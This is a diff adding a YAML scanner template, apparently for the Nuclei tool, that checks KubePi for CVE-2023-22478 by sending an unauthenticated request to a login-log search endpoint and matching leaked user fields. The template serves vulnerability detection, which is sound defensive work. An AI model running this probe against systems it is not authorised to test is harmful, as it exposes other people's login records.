@@ -1,0 +1,31 @@
+id: cve-2023-22478-fit2cloud-kubepi-unauthorized-access
+info:
+  name: Fit2cloud Kubepi Unauthorized Access
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: cve-2023-22478,unauthorized-access
+http:
+  - raw:
+      - |
+        POST /kubepi/api/v1/systems/login/logs/search?pageNum=1&&pageSize=10 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "apiVersion"
+        part: body
+      - type: word
+        words:
+          - "uuid"
+        part: body
+      - type: word
+        words:
+          - "userName"
+        part: body
